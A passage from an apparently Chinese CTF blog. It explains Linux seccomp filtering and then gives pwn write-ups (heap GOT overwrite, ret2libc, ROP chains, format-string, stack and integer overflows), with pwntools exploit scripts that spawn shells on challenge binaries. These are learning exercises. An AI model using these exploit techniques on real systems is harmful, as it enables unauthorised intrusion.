(for<br>example,rendering the set-user-ID and set-group-ID modebits,and file capabilities non-functional). Once set,the no_new_privs attribute cannot be unset. </p></blockquote><p>简单来说就是禁用<code>execve()</code>函数以及使用到<code>execve()</code>的其他函数</p><p>对于第二个<code>prctl()</code>, 22就是<code>PR_SET_SECCOMP</code>, 查到的作用是:</p><blockquote><p>Set the secure computing (seccomp) mode for the calling thread, to limit the available system calls.</p><p>With arg2 set to <strong>SECCOMP_MODE_STRICT</strong>(equals 1),the only systemcalls that the thread is permitted to make are <code>read</code>(2)，<code>write</code>(2)，<code>_exit</code>(2)(but not exit_group(2)), and <code>sigreturn</code>(2). Other system calls result in the deliveryof a <code>SIGKILL</code> signal. </p><p>With arg2 set to <strong>SECCOMP_MODE_FILTER</strong>(equals 2)(since Linux 3.5)，the system calls allowed are defined by a pointer to aBerkeley Packet Filter passed in arg3. <em>This argument is apointer to struct sock_fprog</em>; it can be designed to filterarbitrary system calls and system call arguments. </p></blockquote><p>如果选了SECCOMP_MODE_FILTER:</p><p>我们先解释一些原理, 一些示例网站在此 (<a href="https://blog.csdn.net/u013250169/article/details/115669655">seccomp1</a>) (<a href="https://www.jianshu.com/p/75e157cea215">seccomp2</a>) (<a href="https://linux.cn/article-9507-1.html">BPF介绍</a>) (<a href="https://www.cnblogs.com/honpey/p/8013073.html">BPF指令集</a>):</p><ul><li>两个关键struct:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Filter block */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span> <br>   __u16 code; <span class="hljs-comment">/* Actual filter code */</span> <br>   __u8 jt; <span class="hljs-comment">/* Jump true */</span><br>   __u8 jf; <span class="hljs-comment">/* Jump false */</span><br>   __u32 k; <span class="hljs-comment">/* Generic multiuse field */</span> <br>  <br>&#125;; <br><span class="hljs-comment">/* Required for SO_ATTACH_FILTER. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span> <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> len; <span class="hljs-comment">/* Number of filter blocks */</span> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <br>&#125;;<br></code></pre></div></td></tr></table></figure><ol><li>code变量涉及到了BPF这种技术, 而seccomp技术就是借鉴BPF的源码, 所以可以到BPF的指令集中找到这个变量的组合方式, 用一些神奇的手段把一些instructions编码进u16中. </li><li>jt和jf的意思较为明显, 就是jump if true||false</li><li>k装啥都行</li></ol><ul><li>作用原理:</li></ul><blockquote><p>每个系统调用都会陷入系统调用控制函数syscall_trace_enter中，该函数中调用了secure_computing，系统调用号作为参数传递。在__secure_computing函数中，通过current-&gt;seccomp.mode提取标志位mode，如果mode为1或者2，则说明当前进程已经设置了seccomp限制。如果是1(<strong>SECCOMP_MODE_STRICT</strong>)则就只允许四个系统调用, 如果是2(<strong>SECCOMP_MODE_FILTER</strong>)就如上面所示</p></blockquote><ul><li>效果: 就是自己设定每一条系统调用所对应的处理方法, 查询方式可以使用下面的工具, 自己设置可以小部分参考→<a href="https://blog.csdn.net/u013250169/article/details/115669655">这里</a>.</li></ul><p><strong>seccomp-tools</strong>用法:(<a href="https://github.com/david942j/seccomp-tools">Github Page</a>)</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo gem install seccomp-tools<br>nevv@ubuntu:~/Desktop/seccomp-tools-master/bin$ seccomp-tools dump ../../pwn1<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 # line11<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 # 0011这个就是左边的标号<br> 0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011<br> 0005: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0011<br> 0006: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0011<br> 0007: 0x15 0x03 0x00 0x0000009d  if (A == prctl) goto 0011<br> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011<br> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011<br> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0011: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)  #有任何一个不允许的系统调用出现时就反回errornumber<br></code></pre></div></td></tr></table></figure><h2 id="19-babyfengshui-33c3-2016"><a href="#19-babyfengshui-33c3-2016" class="headerlink" title="19.babyfengshui_33c3_2016"></a>19.babyfengshui_33c3_2016</h2><blockquote><p>在<a href="./glibc_malloc_srcCode.md#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0">源代码分析</a>中的关键函数部分提到过从几个功能函数推断出存储的结构体, 这次我没注意到这个细节, 属实是hacknote这题直接源码看一遍草草了事, 一些细节给我忽略了.</p><p>善用<code>gdb.attach()</code>, 说实话这样子看堆的结构是最为直观的, 但是我又大意了, 环境和服务器的不一样也不能直接用</p><p>还有一件事, 可以把一些自动生成的名称改一下, 这样子更好看源代码</p></blockquote><p>这题认认真真的分析了一遍源代码, 又花了将近一天的时间, 我也不知道为啥会这么慢</p><ol><li>首先从add函数中看出存数据的结构体是长这个样子的</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user</span>//总共<span class="hljs-title">user_data</span>区有0<span class="hljs-title">x80</span>字节</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * description;<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">0x7c</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>​    而且先malloc description的size(用户输入)字节, 然后再malloc user的0x80字节<br>2. delete和display没有什么特别的, 稍微看一下就可以看出add中count变量(当然是自己改的名字)<br>3. 然后update有个很蠢的检验方法, 主要是他想着user和description是相邻的而且顺序也是一样的, 这样的话我们就可以使用没有tcache的glibc版本来绕过</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="hljs-keyword">char</span> *)*(&amp;ptr + a1) - <span class="hljs-number">4</span> )<br></code></pre></div></td></tr></table></figure><ol start="4"><li>先申请三个chunk, 第三个存”/bin/sh”</li><li>将free_got 地址覆盖在chunk 1的description指针上, 通过display函数打印出来</li><li>通过LibcSearcher找出sys_addr</li><li>改写chunk 1 的description内容为sys_addr, 实际上就是改写free_got为sys_addr</li><li>调用delete(1)即可</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#from pwn import *</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><span class="hljs-comment">#context.binary = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;babyfengshui_33c3_2016&quot;</span>)<br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>free_plt = elf.plt[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-comment">#c = 0</span><br><span class="hljs-comment">#if c == 0:</span><br><span class="hljs-comment">#    p = remote(&quot;node4.buuoj.cn&quot;, 26834)</span><br><span class="hljs-comment">#else:</span><br><span class="hljs-comment">#    p = process(&quot;./babyfengshui_33c3_2016&quot;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,name,length,text</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">index,length,text</span>):</span><br><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">0x19c</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x198</span>+p32(free_got))<br><br>display(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>, free_addr)<br>base = free_addr - libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>system_addr = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br><br>update(<span class="hljs-number">1</span>, <span class="hljs-number">0x8</span>, p32(system_addr))<br>delete(<span class="hljs-number">2</span>)<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="20-xdctf2015-pwn200"><a href="#20-xdctf2015-pwn200" class="headerlink" title="20.xdctf2015_pwn200"></a>20.xdctf2015_pwn200</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">libc = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;bof&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span><br>payload += flat([elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>write_addr = u32(rn(<span class="hljs-number">4</span>)[:])<br><br>base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) <span class="hljs-comment">#就是这里只能用bytes类型, 其他没什么可注意的了</span><br><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>, sys_addr, elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], binsh])<br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>sl(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="21-inndy-rop"><a href="#21-inndy-rop" class="headerlink" title="21.inndy_rop"></a>21.inndy_rop</h2><p>这题非常之直接, 静态链接+数组定义gets函数, 摆明了就是利用ROP</p><p>但是ROP比较长, 直接使用<code>ROPgadget --binary rop --ropchain</code>让它自动生成exploit</p><p>复制粘贴, 然后完事了………</p><p>唯一要注意的就是自动生成的是python2的语法, 如果有什么str类型的数据要把他变成bytes</p><h2 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h2>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn: 攻防世界新手区pwn题解</title>
    <link href="/2021-07/pwn-ctf-pwn2/"/>
    <url>/2021-07/pwn-ctf-pwn2/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-攻防世界新手区pwn题解"><a href="#pwn-攻防世界新手区pwn题解" class="headerlink" title="pwn: 攻防世界新手区pwn题解"></a>pwn: 攻防世界新手区pwn题解</h1><p>Adworld的新手区水题记录。 </p><h2 id="1-get-shell"><a href="#1-get-shell" class="headerlink" title="1 get shell"></a>1 get shell</h2><p>没什么好说的。直接remote或者nc连上去就可以了。</p><h2 id="2-CGfsb"><a href="#2-CGfsb" class="headerlink" title="2 CGfsb"></a>2 CGfsb</h2><h3 id="2-1-checksec"><a href="#2-1-checksec" class="headerlink" title="2.1 checksec"></a>2.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/NLtTXI1s2VZxOgY.png" alt="1"></p><h3 id="2-2-找漏洞"><a href="#2-2-找漏洞" class="headerlink" title="2.2 找漏洞"></a>2.2 找漏洞</h3><p>IDA打开main函数。</p><p><img src="https://i.loli.net/2021/07/19/gftCLErnSAbqV7N.png" alt="2"></p><p>可以看出<code>printf(&amp;s);</code>是明显的格式化字符串漏洞。</p><p>IDA mov 从右往左.</p><p>pwnme的地址：0x804A068<img src="https://i.loli.net/2021/07/19/B41GJedNSzW7x2c.png" alt="image-20210716120017221" style="zoom:67%;" /> <strong>看清楚, 压入的是format字符串的地址!!</strong>.</p><p><img src="https://i.loli.net/2021/07/19/ylWdNF7t21mcRsY.png" alt="3"></p><h3 id="2-3-脚本"><a href="#2-3-脚本" class="headerlink" title="2.3 脚本"></a>2.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#CGfsb.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = p32(<span class="hljs-number">0x804A068</span>) + <span class="hljs-string">&#x27;AAAA%10$n&#x27;</span> <span class="hljs-comment">#这个10是自己试出来的</span><br><span class="hljs-comment">#payload = &#x27;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./CGfsb&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;please:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="3-when-did-you-born"><a href="#3-when-did-you-born" class="headerlink" title="3 when did you born"></a>3 when did you born</h2><h3 id="3-1-checksec"><a href="#3-1-checksec" class="headerlink" title="3.1 checksec"></a>3.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/m75TCOwzUhu4naY.png" alt="4"></p><h3 id="3-2-找漏洞"><a href="#3-2-找漏洞" class="headerlink" title="3.2 找漏洞"></a>3.2 找漏洞</h3><p>IDA64打开。</p><img src="https://i.loli.net/2021/07/19/kiDx1ElBSs3a9QP.png" alt="5" style="zoom: 77%;" /><p>很明显，第一个输入的数字不能是1926（Excited!)</p><p>然后通过gets把他变成1926（Naive!）</p><h3 id="3-3-脚本"><a href="#3-3-脚本" class="headerlink" title="3.3 脚本"></a>3.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#when_did_you_born.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span> + p32(<span class="hljs-number">1926</span>)<br>r = process(<span class="hljs-string">&#x27;./when_did_you_born&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Birth?\n&#x27;</span>,<span class="hljs-string">&#x27;1925&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Name?\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-hello-pwn"><a href="#4-hello-pwn" class="headerlink" title="4 hello pwn"></a>4 hello pwn</h2><h3 id="4-1-checksec"><a href="#4-1-checksec" class="headerlink" title="4.1 checksec"></a>4.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/xyLCbiM2sQ6OqnZ.png" alt="6"></p><h3 id="4-2-找漏洞"><a href="#4-2-找漏洞" class="headerlink" title="4.2 找漏洞"></a>4.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/F1EKL38tD4lCkjm.png" alt="7"></p><p>逻辑很简单，在<code>unk_601068</code>读入一个值，让<code>dword_60106c</code>变为<code>1853186401</code>即可。</p><h3 id="4-3-脚本"><a href="#4-3-脚本" class="headerlink" title="4.3 脚本"></a>4.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#hello_pen.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(<span class="hljs-number">1853186401</span>)<span class="hljs-comment">#-&gt;转换成16进制就是八位数了, 可以p32</span><br><br>r = process(<span class="hljs-string">&#x27;./hello_pwn&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;bof\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="5-level0"><a href="#5-level0" class="headerlink" title="5 level0"></a>5 level0</h2><h3 id="5-1-checksec"><a href="#5-1-checksec" class="headerlink" title="5.1 checksec"></a>5.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/Fiunr2gLte3zOqa.png" alt="8"></p><h3 id="5-2-找漏洞"><a href="#5-2-找漏洞" class="headerlink" title="5.2 找漏洞"></a>5.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/ZqmXBSlNDhP9MVu.png" alt="9" style="zoom:67%;" /><p>这里好像有个什么东西嘛…</p><h3 id="5-3-脚本"><a href="#5-3-脚本" class="headerlink" title="5.3 脚本"></a>5.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#level0.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x400596</span>)<span class="hljs-comment">#callsystem的地址, 简单的read栈溢出</span><br><span class="hljs-comment">#r = process(&#x27;./level0&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">45579</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;World\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="6-level2"><a href="#6-level2" class="headerlink" title="6 level2"></a>6 level2</h2><h3 id="6-1-checksec"><a href="#6-1-checksec" class="headerlink" title="6.1 checksec"></a>6.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/UkONFSAoqVgPyjB.png" alt="10"></p><h3 id="6-2-找漏洞"><a href="#6-2-找漏洞" class="headerlink" title="6.2 找漏洞"></a>6.2 找漏洞</h3><p>system函数！</p><img src="https://i.loli.net/2021/07/19/YKBlwLMFsot4xNy.png" alt="11" style="zoom:80%;" /><p>/bin/sh!</p><img src="https://i.loli.net/2021/07/19/dvgGrQhzkw87ZBP.png" alt="12" style="zoom:80%;" /><p>溢出地址0x8c，返回地址填plt的system地址，参数填/bin/sh的地址。奥利给！</p><p>ps. 会了才知道为什么洛神会这么简洁…..|ू･ω･` )</p><h3 id="6-3-脚本"><a href="#6-3-脚本" class="headerlink" title="6.3 脚本"></a>6.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>+ p32(<span class="hljs-number">0x804A024</span>) <span class="hljs-comment">#空4字节是system函数的返回地址</span><br><span class="hljs-comment">#r = remote(&#x27;111.198.29.45&#x27;,49960)</span><br>r = process(<span class="hljs-string">&quot;./level2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Input:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="7-guess-num"><a href="#7-guess-num" class="headerlink" title="7 guess num"></a>7 guess num</h2><h3 id="7-1-checksec"><a href="#7-1-checksec" class="headerlink" title="7.1 checksec"></a>7.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/uN6HcDVqr28J1ml.png" alt="13"></p><h3 id="7-2-找漏洞"><a href="#7-2-找漏洞" class="headerlink" title="7.2 找漏洞"></a>7.2 找漏洞</h3><p>猜数字，先生成了个随机数，然后猜9次。猜对了给flag。</p><img src="https://i.loli.net/2021/07/19/SNmUETKHkDqcroa.png" alt="14" style="zoom:80%;" /><p>很显然，只要通过get函数把随机种子改成自己想要的就行了。</p><p>先写个脚本看看随机种子是0的情况：</p><img src="https://i.loli.net/2021/07/19/YSh74wOVLI3KpTU.png" alt="15" style="zoom:80%;" /><p>写脚本吧。字符串长度为0x30-0x10=0x20。偏移值后面加个0就行。</p><h3 id="7-3-脚本"><a href="#7-3-脚本" class="headerlink" title="7.3 脚本"></a>7.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>l = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>* <span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0</span>)<br>r = process(<span class="hljs-string">&#x27;./guess_num&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> l:<br>r.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(each))<span class="hljs-comment">#sendlineafter的参数就是字符串</span><br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="8-int-overflow"><a href="#8-int-overflow" class="headerlink" title="8 int overflow"></a>8 int overflow</h2><h3 id="8-1-checksec"><a href="#8-1-checksec" class="headerlink" title="8.1 checksec"></a>8.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/N6oXuSjhaAGOz4x.png" alt="16"></p><h3 id="8-2-找漏洞"><a href="#8-2-找漏洞" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/xEalQB5bc1ovGXy.png" alt="17" style="zoom:80%;" /><p>先进这个函数。</p><p><img src="https://i.loli.net/2021/07/19/n82u3GmtfbsLcjk.png" alt="18"></p><p>显而易见嘛。(?)</p><p>再进check_passwd()</p><p><img src="https://i.loli.net/2021/07/19/MVbGalDqcB3miJp.png" alt="image-20210716122047227" style="zoom: 80%;" />可以看到__int8, 只有0-255, 而且有要求密码长4-8, 所以可以整数溢出的办法, buf长512也够了</p><h3 id="8-3-脚本"><a href="#8-3-脚本" class="headerlink" title="8.3 脚本"></a>8.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">50645</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x0804868B</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">232</span><br>r.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">&quot;f**k&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;passwd:\n&quot;</span>, 